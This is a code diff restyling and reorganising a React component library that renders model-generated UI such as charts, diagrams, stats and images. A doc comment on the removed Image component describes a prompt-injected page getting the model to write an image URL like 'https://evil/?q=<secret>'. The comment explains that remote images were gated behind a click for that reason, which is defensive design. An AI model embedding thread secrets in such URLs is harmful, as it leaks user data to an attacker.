+          </CarouselItem>
+        ))}
+      </CarouselContent>
+      {props.images.length > 1 && (
+        <>
+          <CarouselPrevious className="left-2" />
+          <CarouselNext className="right-2" />
+        </>
+      )}
+    </Carousel>
+  ),
+})
+
+/* ── Diagrams ── */
+
+/** The frame a diagram sits in is `Box`'s, so it is a card on the page and a
+    well inside one, like everything else. */
+function Figure({ code, narrowCode, caption }: { code: string; narrowCode?: string; caption?: string }) {
+  return (
+    <Box className={PAD}>
+      <MermaidFigure code={code} narrowCode={narrowCode} caption={caption} box="p-0" />
+    </Box>
+  )
+}
+
+/** A graph written as what it is — nodes and edges — rather than as mermaid
+    source: mermaid's syntax is one more thing to get wrong. */
+const Diagram = defineComponent({
+  name: "Diagram",
+  description: "A flowchart from nodes and edges: each node has an id and a label, each edge joins two ids.",
+  props: z.object({
+    nodes: z.array(
+      z.object({
+        id: z.string(),
+        label: z.string().optional(),
+        shape: z.enum(["box", "round", "diamond", "circle"]).optional(),
+      })
+    ),
+    edges: z.array(
+      z.object({
+        from: z.string(),
+        to: z.string(),
+        label: z.string().optional(),
+        dashed: z.boolean().optional(),
+      })
+    ),
+    direction: z.enum(["down", "right"]).optional(),
+    caption: z.string().optional(),
+  }),
+  /* A pipeline drawn sideways on a phone is a strip of 6px text; below
+     `@panel-sm` it is drawn top-down, which is the one shape a column keeps. */
+  component: ({ props }) => (
+    <Figure
+      code={diagramToMermaid(props.nodes, props.edges, props.direction ?? "down")}
+      narrowCode={props.direction === "right" ? diagramToMermaid(props.nodes, props.edges, "down") : undefined}
+      caption={props.caption}
+    />
+  ),
+})
+
+/** Mermaid source, drawn. The escape hatch for what `Diagram` cannot spell. */
+const Mermaid = defineComponent({
+  name: "Mermaid",
+  description: "A diagram written in Mermaid syntax (sequence, state, class, gantt, flowchart).",
+  props: z.object({
+    code: z.string(),
+    caption: z.string().optional(),
+  }),
+  component: ({ props }) => <Figure code={props.code} caption={props.caption} />,
+})
+
+/* ── Numbers ── */
+
+/** One metric: its name in small caps, the figure large and tabular, the hint
+    under it. On its own it is a frame; inside a `StatRow` it is a cell of the
+    row's frame. */
+const Stat = defineComponent({
+  name: "Stat",
+  description: "A single metric: a label and a value.",
+  props: z.object({
+    label: z.string(),
+    value: z.string(),
+    hint: z.string().optional(),
+  }),
+  component: ({ props }) => (
+    <Box className={cn(PAD, "space-y-1")}>
+      <p className={cn(LABEL, "text-balance")}>{props.label}</p>
+      <p className="break-words text-xl leading-tight font-semibold tracking-tight text-foreground tabular-nums @panel-sm:text-2xl">
+        {props.value}
+      </p>
+      {props.hint && <p className={cn(META, "text-pretty")}>{props.hint}</p>}
+    </Box>
+  ),
+})
+
+/** A row of `Stat`s as one frame split into cells. Each cell draws its own
+    right and bottom hairline as a shadow, and the frame's `overflow-hidden`
+    clips the ones on its outer edge — so a row that wraps short leaves card
+    ground in the gap, not the grey block a `gap-px` grid would. */
+const StatRow = defineComponent({
+  name: "StatRow",
+  description: "A row of metrics across the width of the page.",
+  props: z.object({
+    stats: z.array(Stat.ref),
+  }),
+  component: ({ props, renderNode }) => (
+    <Box
+      className={cn(
+        "grid bg-card [&>*]:shadow-[1px_0_0_0_var(--border),0_1px_0_0_var(--border)]",
+        props.stats.length > 1
+          ? "grid-cols-2 @panel-sm:grid-cols-[repeat(auto-fit,minmax(9rem,1fr))]"
+          : "grid-cols-1"
+      )}
+    >
+      <SurfaceContext.Provider value="cell">{renderNode(props.stats)}</SurfaceContext.Provider>
+    </Box>
+  ),
+})
+
+/** A labelled 0-100 meter: label and figure on one line, the bar under them. */
+const Progress = defineComponent({
+  name: "Progress",
+  description: "A labelled 0–100 meter.",
+  props: z.object({
+    label: z.string(),
+    value: z.number(),
+    hint: z.string().optional(),
+  }),
+  component: ({ props }) => (
+    <div className="min-w-0 space-y-1.5">
+      <div className="flex min-w-0 items-baseline justify-between gap-x-3">
+        <span className={cn(BODY, "min-w-0 truncate")}>{props.label}</span>
+        <span className="shrink-0 text-xs font-medium text-foreground tabular-nums">
+          {props.hint ?? `${Math.round(props.value)}%`}
+        </span>
+      </div>
+      <div className="h-2 overflow-hidden rounded-pill bg-muted">
+        <div
+          className="h-full rounded-pill bg-primary"
+          style={{ width: `${Math.min(100, Math.max(0, props.value))}%` }}
+        />
+      </div>
+    </div>
   ),
 })
 
 /** A chart: `labels` x-axis, `series` one mark each, the value at index `i`
-    belonging to `labels[i]`. The colours are the app's `--chart-*` tokens, so a
-    generated chart follows the reader's palette instead of naming its own.
+    belonging to `labels[i]`. Colours are the app's `--chart-*` tokens.
     `pie`/`donut` read the first series only — a slice per label. */
 const chartColor = (index: number) => `var(--chart-${(index % 5) + 1})`
 
@@ -347,581 +941,122 @@ const Chart = defineComponent({
         : props.series.map((series, index) => [series.name, { label: series.name, color: chartColor(index) }])
     )
     const stack = props.stacked ? "a" : undefined
-    /* The mobile work here is all in the gutters, because a chart cannot reflow:
-       a 30px Y gutter and 11px ticks give a 320px panel most of its width back,
-       and `preserveStartEnd` keeps the ends instead of every colliding label.
+    /* A chart cannot reflow, so the mobile work is all in the gutters: a 32px Y
+       gutter and 11px ticks give a 320px panel most of its width back, and
+       `preserveStartEnd` keeps the ends instead of every colliding label.
        `ChartContainer` passes `initialDimension`, so a panel not yet laid out
        draws a sized chart rather than an empty box. */
     const axes = (
       <>
-        <CartesianGrid vertical={false} />
+        <CartesianGrid vertical={false} strokeDasharray="3 3" />
         <XAxis
           dataKey="label"
           tickLine={false}
           axisLine={false}
-          tickMargin={6}
+          tickMargin={8}
           fontSize={11}
           interval="preserveStartEnd"
         />
-        <YAxis tickLine={false} axisLine={false} width={30} fontSize={11} />
+        <YAxis tickLine={false} axisLine={false} width={32} fontSize={11} />
         <ChartTooltip content={<ChartTooltipContent />} />
       </>
     )
-    const margin = { left: 0, right: 6 }
+    const margin = { left: 0, right: 8, top: 4 }
     const legend = props.series.length > 1 && <ChartLegend content={<ChartLegendContent />} />
     return (
-      <ChartContainer
-        config={config}
-        className="aspect-auto w-full"
-        style={{ height: `${props.height ?? (round || props.kind === "radar" ? 240 : 200)}px` }}
-      >
-        {round ? (
-          <PieChart>
-            <ChartTooltip content={<ChartTooltipContent nameKey="label" hideLabel />} />
-            <Pie
-              data={props.labels.map((label, index) => ({ label, value: props.series[0]?.values[index] ?? 0 }))}
-              dataKey="value"
-              nameKey="label"
-              innerRadius={props.kind === "donut" ? "55%" : 0}
-              strokeWidth={2}
-            >
-              {props.labels.map((label, index) => (
-                <Cell key={label} fill={chartColor(index)} />
-              ))}
-            </Pie>
-            <ChartLegend content={<ChartLegendContent nameKey="label" />} />
-          </PieChart>
-        ) : props.kind === "radar" ? (
-          <RadarChart data={data}>
-            <PolarGrid />
-            <PolarAngleAxis dataKey="label" fontSize={11} />
-            <ChartTooltip content={<ChartTooltipContent />} />
-            {props.series.map((series, index) => (
-              <Radar
-                key={series.name}
-                dataKey={series.name}
-                stroke={chartColor(index)}
-                fill={chartColor(index)}
-                fillOpacity={0.25}
-              />
-            ))}
-            {legend}
-          </RadarChart>
-        ) : props.kind === "bar" ? (
-          <BarChart data={data} margin={margin}>
-            {axes}
-            {props.series.map((series, index) => (
-              <Bar key={series.name} dataKey={series.name} stackId={stack} fill={chartColor(index)} radius={stack ? 0 : 4} />
-            ))}
-            {legend}
-          </BarChart>
-        ) : props.kind === "area" ? (
-          <AreaChart data={data} margin={margin}>
-            {axes}
-            {props.series.map((series, index) => (
-              <Area
-                key={series.name}
-                type="monotone"
-                dataKey={series.name}
-                stackId={stack}
-                stroke={chartColor(index)}
-                fill={chartColor(index)}
-                fillOpacity={0.25}
-              />
-            ))}
-            {legend}
-          </AreaChart>
-        ) : (
-          <LineChart data={data} margin={margin}>
-            {axes}
-            {props.series.map((series, index) => (
-              <Line
-                key={series.name}
-                type="monotone"
-                dataKey={series.name}
-                stroke={chartColor(index)}
+      <Box className="px-2 pt-3 pb-2 @panel-sm:px-3">
+        <ChartContainer
+          config={config}
+          className="aspect-auto w-full min-w-0"
+          style={{ height: `${props.height ?? (round || props.kind === "radar" ? 240 : 200)}px` }}
+        >
+          {round ? (
+            <PieChart>
+              <ChartTooltip content={<ChartTooltipContent nameKey="label" hideLabel />} />
+              <Pie
+                data={props.labels.map((label, index) => ({ label, value: props.series[0]?.values[index] ?? 0 }))}
+                dataKey="value"
+                nameKey="label"
+                innerRadius={props.kind === "donut" ? "58%" : 0}
+                paddingAngle={props.kind === "donut" ? 2 : 0}
+                stroke="var(--card)"
                 strokeWidth={2}
-                dot={false}
-              />
-            ))}
-            {legend}
-          </LineChart>
-        )}
-      </ChartContainer>
+              >
+                {props.labels.map((label, index) => (
+                  <Cell key={label} fill={chartColor(index)} />
+                ))}
+              </Pie>
+              <ChartLegend content={<ChartLegendContent nameKey="label" />} />
+            </PieChart>
+          ) : props.kind === "radar" ? (
+            <RadarChart data={data}>
+              <PolarGrid />
+              <PolarAngleAxis dataKey="label" fontSize={11} />
+              <ChartTooltip content={<ChartTooltipContent />} />
+              {props.series.map((series, index) => (
+                <Radar
+                  key={series.name}
+                  dataKey={series.name}
+                  stroke={chartColor(index)}
+                  fill={chartColor(index)}
+                  fillOpacity={0.2}
+                />
+              ))}
+              {legend}
+            </RadarChart>
+          ) : props.kind === "bar" ? (
+            <BarChart data={data} margin={margin}>
+              {axes}
+              {props.series.map((series, index) => (
+                <Bar
+                  key={series.name}
+                  dataKey={series.name}
+                  stackId={stack}
+                  fill={chartColor(index)}
+                  radius={stack ? 0 : [4, 4, 0, 0]}
+                  maxBarSize={40}
+                />
+              ))}
+              {legend}
+            </BarChart>
+          ) : props.kind === "area" ? (
+            <AreaChart data={data} margin={margin}>
+              {axes}
+              {props.series.map((series, index) => (
+                <Area
+                  key={series.name}
+                  type="monotone"
+                  dataKey={series.name}
+                  stackId={stack}
+                  stroke={chartColor(index)}
+                  strokeWidth={2}
+                  fill={chartColor(index)}
+                  fillOpacity={0.15}
+                />
+              ))}
+              {legend}
+            </AreaChart>
+          ) : (
+            <LineChart data={data} margin={margin}>
+              {axes}
+              {props.series.map((series, index) => (
+                <Line
+                  key={series.name}
+                  type="monotone"
+                  dataKey={series.name}
+                  stroke={chartColor(index)}
+                  strokeWidth={2}
+                  dot={false}
+                  activeDot={{ r: 4 }}
+                />
+              ))}
+              {legend}
+            </LineChart>
+          )}
+        </ChartContainer>
+      </Box>
     )
   },
-})
-
-/**
- * An image. Remote images are the one thing in this library that would reach
- * the network, and a URL the model writes can carry whatever the thread has read
- * (a prompt-injected page asking for `https://evil/?q=<secret>`). So a `data:`
- * image draws at once and an `http(s)` one waits behind a click that names its
- * host — the reader's consent is the fetch. Anything else is not drawn.
- */
-const Image = defineComponent({
-  name: "Image",
-  description: "An image from an https or data: URL, with alt text and an optional caption.",
-  props: z.object({
-    src: z.string(),
-    alt: z.string(),
-    caption: z.string().optional(),
-  }),
-  component: ({ props }) => <GeneratedImage {...props} />,
-})
-
-function GeneratedImage({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
-  const inline = /^data:image\/(png|jpe?g|gif|webp);/i.test(src)
-  let host: string | null = null
-  try {
-    const url = new URL(src)
-    if (url.protocol === "https:" || url.protocol === "http:") host = url.host
-  } catch {
-    /* not a URL — drawn as the alt text below */
-  }
-  const [shown, setShown] = useState(inline)
-  const [failed, setFailed] = useState(false)
-  return (
-    <figure className="min-w-0 space-y-1">
-      {shown && !failed ? (
-        <img
-          src={src}
-          alt={alt}
-          referrerPolicy="no-referrer"
-          onError={() => setFailed(true)}
-          className="max-h-96 max-w-full rounded-md border border-border/50 object-contain"
-        />
-      ) : host && !failed ? (
-        <button
-          type="button"
-          onClick={() => setShown(true)}
-          className="flex w-full flex-col items-start gap-0.5 rounded-md border border-dashed border-border/60 px-2.5 py-2 text-start hover:bg-muted/40"
-        >
-          <span className="text-[12.5px] text-foreground/90">{alt}</span>
-          <span className="text-[11px] text-muted-foreground">Load image from {host}</span>
-        </button>
-      ) : (
-        <Empty size="sm">{failed ? `Image failed to load: ${alt}` : alt}</Empty>
-      )}
-      {caption && <figcaption className="text-[11px] text-pretty text-muted-foreground">{caption}</figcaption>}
-    </figure>
-  )
-}
-
-/** Short labels in a row — statuses, tags, versions. */
-const Badges = defineComponent({
-  name: "Badges",
-  description: "A row of short tags, each with an optional tone.",
-  props: z.object({
-    items: z.array(
-      z.object({
-        text: z.string(),
-        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
-      })
-    ),
-  }),
-  component: ({ props }) => (
-    <div className="flex min-w-0 flex-wrap gap-1.5">
-      {props.items.map((item, index) => (
-        <span
-          key={index}
-          className={cn(
-            "rounded-pill border px-2 py-0.5 text-[11px] font-medium",
-            TONE_TEXT[item.tone ?? "neutral"]
-          )}
-        >
-          {item.text}
-        </span>
-      ))}
-    </div>
-  ),
-})
-
-const TONE_TEXT = {
-  neutral: "border-border/60 bg-muted/40 text-foreground/80",
-  info: "border-chart-2/30 bg-chart-2/10 text-chart-2",
-  success: "border-primary/30 bg-primary/10 text-primary",
-  warn: "border-chart-3/30 bg-chart-3/10 text-chart-3",
-  error: "border-destructive/30 bg-destructive/10 text-destructive",
-} as const
-
-/** Ordered events or steps with a state each — a release history, a plan's
-    progress. The rail is the list, so no numbering is needed. */
-const Timeline = defineComponent({
-  name: "Timeline",
-  description: "Ordered steps or events: a title, optional time and text, and a status.",
-  props: z.object({
-    items: z.array(
-      z.object({
-        title: z.string(),
-        time: z.string().optional(),
-        text: z.string().optional(),
-        status: z.enum(["done", "active", "pending", "failed"]).optional(),
-      })
-    ),
-  }),
-  component: ({ props }) => (
-    <ol className="min-w-0">
-      {props.items.map((item, index) => (
-        <li key={index} className="relative flex gap-2.5 pb-3 last:pb-0">
-          {index < props.items.length - 1 && (
-            <span className="absolute top-3 bottom-0 left-[4.5px] w-px bg-border/60" />
-          )}
-          <span
-            className={cn(
-              "mt-1 size-2.5 shrink-0 rounded-full border-2",
-              item.status === "done" && "border-primary bg-primary",
-              item.status === "active" && "border-primary bg-background",
-              item.status === "failed" && "border-destructive bg-destructive",
-              (!item.status || item.status === "pending") && "border-border bg-background"
-            )}
-          />
-          <div className="min-w-0 flex-1">
-            <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-2">
-              <span className="text-[12.5px] font-medium text-foreground">{item.title}</span>
-              {item.time && <span className="text-[11px] tabular-nums text-muted-foreground">{item.time}</span>}
-            </div>
-            {item.text && <p className="text-[12px] text-pretty text-muted-foreground">{item.text}</p>}
-          </div>
-        </li>
-      ))}
-    </ol>
-  ),
-})
-
-/** A side-by-side comparison of two or more options — the pros-and-cons shape
-    a table flattens into sentences. Stacks below `@panel-sm`. */
-const Compare = defineComponent({
-  name: "Compare",
-  description: "Options side by side, each with a name, optional verdict, pros and cons.",
-  props: z.object({
-    options: z.array(
-      z.object({
-        name: z.string(),
-        verdict: z.string().optional(),
-        pros: z.array(z.string()).optional(),
-        cons: z.array(z.string()).optional(),
-      })
-    ),
-  }),
-  component: ({ props }) => (
-    <div className="grid min-w-0 gap-2 @panel-sm:grid-cols-[repeat(auto-fit,minmax(0,1fr))]">
-      {props.options.map((option, index) => (
-        <div key={index} className="min-w-0 space-y-1.5 rounded-lg border border-border/50 bg-background/50 px-2.5 py-2">
-          <p className="text-[13px] font-semibold text-foreground">{option.name}</p>
-          {option.verdict && <p className="text-[11.5px] text-muted-foreground">{option.verdict}</p>}
-          <ul className="space-y-0.5 text-[12px]">
-            {option.pros?.map((pro, i) => (
-              <li key={`p${i}`} className="text-foreground/90">
-                <span className="text-primary">+ </span>
-                {pro}
-              </li>
-            ))}
-            {option.cons?.map((con, i) => (
-              <li key={`c${i}`} className="text-foreground/90">
-                <span className="text-destructive">- </span>
-                {con}
-              </li>
-            ))}
-          </ul>
-        </div>
-      ))}
-    </div>
-  ),
-})
-
-/** A folded section: detail the reader may not need, closed by default. Native
-    `<details>`, so it needs no state and survives the streaming re-render. */
-const Details = defineComponent({
-  name: "Details",
-  description: "A collapsible section, closed unless `open` is true.",
-  props: z.object({
-    summary: z.string(),
-    children: z.array(z.any()),
-    open: z.boolean().optional(),
-  }),
-  component: ({ props, renderNode }) => (
-    <details open={props.open} className="group min-w-0 rounded-md border border-border/50">
-      <summary className="cursor-pointer px-2.5 py-1.5 text-[12.5px] font-medium text-foreground select-none">
-        {props.summary}
-      </summary>
-      <div className={cn("flex flex-col border-t border-border/40 px-2.5 py-2", GAP.md)}>{renderNode(props.children)}</div>
-    </details>
-  ),
-})
-
-/* ── Wrappers over the app's own shadcn primitives ──
-   Each is the `components/ui` piece the rest of the app already draws, given a
-   flat schema. Nothing here can act: tabs, folds and slides move what is shown,
-   never what is stored. */
-
-/** Tabs: alternatives the reader flips between — per-platform steps, before and after. */
-const Tabs = defineComponent({
-  name: "Tabs",
-  description: "Switchable panels: each tab has a label and its own children.",
-  props: z.object({
-    tabs: z.array(z.object({ label: z.string(), children: z.array(z.any()) })),
-  }),
-  component: ({ props, renderNode }) => (
-    <UiTabs defaultValue={0} className="min-w-0">
-      {/* A strip too narrow for its labels scrolls sideways rather than
-          wrapping. `scrollbar-none` hides that scrollbar, and it is not just
-          tidiness: the list is a fixed `h-9` box, so a classic scrollbar takes
-          its ~10px out of the content box, every trigger measures `100%-1px` of
-          what is left, and each label clips against it. The strip still wheels
-          and swipes, and this is the app's own utility for a touch strip. */}
-      <TabsList className="max-w-full overflow-x-auto scrollbar-none">
-        {props.tabs.map((tab, index) => (
-          <TabsTrigger key={index} value={index}>
-            {tab.label}
-          </TabsTrigger>
-        ))}
-      </TabsList>
-      {props.tabs.map((tab, index) => (
-        <TabsContent key={index} value={index} className={cn("flex min-w-0 flex-col", GAP.md)}>
-          {renderNode(tab.children)}
-        </TabsContent>
-      ))}
-    </UiTabs>
-  ),
-})
-
-/** An FAQ-shaped fold: several questions, each opening on its own answer. */
-const Accordion = defineComponent({
-  name: "Accordion",
-  description: "A list of collapsible items, each a title over its own children. Good for FAQs.",
-  props: z.object({
-    items: z.array(z.object({ title: z.string(), children: z.array(z.any()) })),
-  }),
-  component: ({ props, renderNode }) => (
-    <UiAccordion className="min-w-0 rounded-md border border-border/50">
-      {props.items.map((item, index) => (
-        <AccordionItem key={index} value={index}>
-          <AccordionTrigger className="px-2.5">{item.title}</AccordionTrigger>
-          <AccordionContent className="px-2.5">
-            <div className={cn("flex min-w-0 flex-col", GAP.md)}>{renderNode(item.children)}</div>
-          </AccordionContent>
-        </AccordionItem>
-      ))}
-    </UiAccordion>
-  ),
-})
-
-/** A before/after of text, drawn by the same line diff tool steps use. */
-const Diff = defineComponent({
-  name: "Diff",
-  description: "A line diff between old and new text, with an optional path.",
-  props: z.object({
-    before: z.string(),
-    after: z.string(),
-    path: z.string().optional(),
-  }),
-  component: ({ props }) => <DiffView oldText={props.before} newText={props.after} path={props.path} />,
-})
-
-/** Keyboard chords, drawn as keycaps. */
-const Keys = defineComponent({
-  name: "Keys",
-  description: "Keyboard shortcuts: each entry is a list of keys and what the chord does.",
-  props: z.object({
-    items: z.array(z.object({ keys: z.array(z.string()), action: z.string() })),
-  }),
-  component: ({ props }) => (
-    <div className="min-w-0 divide-y divide-border/40">
-      {props.items.map((item, index) => (
-        <div key={index} className="flex min-w-0 flex-wrap items-center justify-between gap-2 py-1.5">
-          <span className="text-[12.5px] text-foreground/90">{item.action}</span>
-          <KbdGroup>
-            {item.keys.map((key, i) => (
-              <Kbd key={i}>{key}</Kbd>
-            ))}
-          </KbdGroup>
-        </div>
-      ))}
-    </div>
-  ),
-})
-
-/** People: initials avatars, never a fetched picture (see `Image` for why). */
-const People = defineComponent({
-  name: "People",
-  description: "A list of people with a name and optional role, drawn as initials avatars.",
-  props: z.object({
-    items: z.array(z.object({ name: z.string(), role: z.string().optional() })),
-  }),
-  component: ({ props }) => (
-    <div className="flex min-w-0 flex-wrap gap-x-4 gap-y-2">
-      {props.items.map((person, index) => (
-        <div key={index} className="flex min-w-0 items-center gap-2">
-          <Avatar size="sm">
-            <AvatarFallback>
-              {person.name
-                .split(/\s+/)
-                .slice(0, 2)
-                .map((word) => word[0]?.toUpperCase() ?? "")
-                .join("")}
-            </AvatarFallback>
-          </Avatar>
-          <div className="min-w-0 leading-tight">
-            <p className="truncate text-[12.5px] font-medium text-foreground">{person.name}</p>
-            {person.role && <p className="truncate text-[11px] text-muted-foreground">{person.role}</p>}
-          </div>
-        </div>
-      ))}
-    </div>
-  ),
-})
-
-/** Several images, one at a time. Each slide is an `Image`, so the click-to-load rule holds. */
-const Gallery = defineComponent({
-  name: "Gallery",
-  description: "A carousel of images, each with src, alt and optional caption.",
-  props: z.object({
-    images: z.array(z.object({ src: z.string(), alt: z.string(), caption: z.string().optional() })),
-  }),
-  /* The arrows sit inside the frame: shadcn hangs them outside it (`-left-12`),
-     which a transcript column has no room for. */
-  component: ({ props }) => (
-    <Carousel className="min-w-0">
-      <CarouselContent>
-        {props.images.map((image, index) => (
-          <CarouselItem key={index}>
-            <GeneratedImage {...image} />
-          </CarouselItem>
-        ))}
-      </CarouselContent>
-      {props.images.length > 1 && (
-        <>
-          <CarouselPrevious className="left-2" />
-          <CarouselNext className="right-2" />
-        </>
-      )}
-    </Carousel>
-  ),
-})
-
-/** A graph, written as what it is — nodes and edges — rather than as mermaid
-    source. This is the door to reach for: mermaid's syntax is one more thing to
-    get wrong, and the arrows are where a generated diagram usually breaks. */
-const Diagram = defineComponent({
-  name: "Diagram",
-  description: "A flowchart from nodes and edges: each node has an id and a label, each edge joins two ids.",
-  props: z.object({
-    nodes: z.array(
-      z.object({
-        id: z.string(),
-        label: z.string().optional(),
-        shape: z.enum(["box", "round", "diamond", "circle"]).optional(),
-      })
-    ),
-    edges: z.array(
-      z.object({
-        from: z.string(),
-        to: z.string(),
-        label: z.string().optional(),
-        dashed: z.boolean().optional(),
-      })
-    ),
-    direction: z.enum(["down", "right"]).optional(),
-    caption: z.string().optional(),
-  }),
-  component: ({ props }) => (
-    <MermaidFigure
-      code={diagramToMermaid(props.nodes, props.edges, props.direction ?? "down")}
-      caption={props.caption}
-    />
-  ),
-})
-
-/** Mermaid source, drawn. The escape hatch for the diagram kinds `Diagram`
-    cannot spell — a sequence, a state machine, a gantt — and it falls back to
-    the source when it will not parse. */
-const Mermaid = defineComponent({
-  name: "Mermaid",
-  description: "A diagram written in Mermaid syntax (sequence, state, class, gantt, flowchart).",
-  props: z.object({
-    code: z.string(),
-    caption: z.string().optional(),
-  }),
-  component: ({ props }) => <MermaidFigure code={props.code} caption={props.caption} />,
-})
-
-/** A labelled value with a bar under it — the one chart that needs no pairs of
-    arrays, and the shape a "top N" answer usually wants. */
-const Progress = defineComponent({
-  name: "Progress",
-  description: "A labelled 0–100 meter.",
-  props: z.object({
-    label: z.string(),
-    value: z.number(),
-    hint: z.string().optional(),
-  }),
-  component: ({ props }) => (
-    <div className="min-w-0 space-y-1">
-      {/* `flex-wrap` so a long label and its figure stack on a narrow panel
-          instead of the figure being squeezed off the edge — the label is the
-          only thing here that can be arbitrarily long. */}
-      <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-2">
-        <span className="min-w-0 truncate text-[12.5px] text-foreground/90">{props.label}</span>
-        <span className="shrink-0 text-[11px] tabular-nums text-muted-foreground">
-          {props.hint ?? `${Math.round(props.value)}%`}
-        </span>
-      </div>
-      <div className="h-1.5 overflow-hidden rounded-pill bg-muted">
-        <div
-          className="h-full rounded-pill bg-primary"
-          style={{ width: `${Math.min(100, Math.max(0, props.value))}%` }}
-        />
-      </div>
-    </div>
-  ),
-})
-
-/** A definition list — the pair shape a table is too heavy for. */
-const KeyValue = defineComponent({
-  name: "KeyValue",
-  description: "A list of named facts.",
-  props: z.object({
-    items: z.array(z.object({ key: z.string(), value: z.string() })),
-  }),
-  /* The key column is a *fixed* `w-32` only where there is room: on a phone
-     panel a third of the width went to the label and every value wrapped into a
-     ragged column. Below `@panel-sm` the pair stacks — key above value — and the
-     divider between rows is what keeps it readable as a list rather than as
-     twenty loose lines. */
-  component: ({ props }) => (
-    <dl className="divide-y divide-border/40 overflow-hidden rounded-md border border-border/50 bg-muted/40">
-      {props.items.map((item, index) => (
-        <div
-          key={index}
-          className="flex flex-col gap-0.5 px-2.5 py-1.5 text-[11.5px] @panel-sm:flex-row @panel-sm:items-start @panel-sm:gap-3"
-        >
-          <dt className="min-w-0 text-muted-foreground @panel-sm:w-32 @panel-sm:shrink-0 @panel-sm:truncate">
-            {item.key}
-          </dt>
-          <dd className="min-w-0 break-words text-foreground/90 @panel-sm:flex-1">{item.value}</dd>
-        </div>
-      ))}
-    </dl>
-  ),
-})
-
-/** An absence, drawn as one: the app's dashed box, never an alert. */
-const EmptyState = defineComponent({
-  name: "EmptyState",
-  description: "A box saying there is nothing to show.",
-  props: z.object({
-    text: z.string(),
-  }),
-  component: ({ props }) => <Empty size="sm">{props.text}</Empty>,
-})
-
-/** A divider, for a generated dashboard that wants one. */
-const Divider = defineComponent({
-  name: "Divider",
-  description: "A horizontal rule.",
-  props: z.object({}),
-  component: () => <hr className="border-border/50" />,
 })
 
 export const openuiLibrary = createLibrary({
@@ -996,4 +1131,3 @@ export const openuiLibrary = createLibrary({
     },
   ],
 })
-
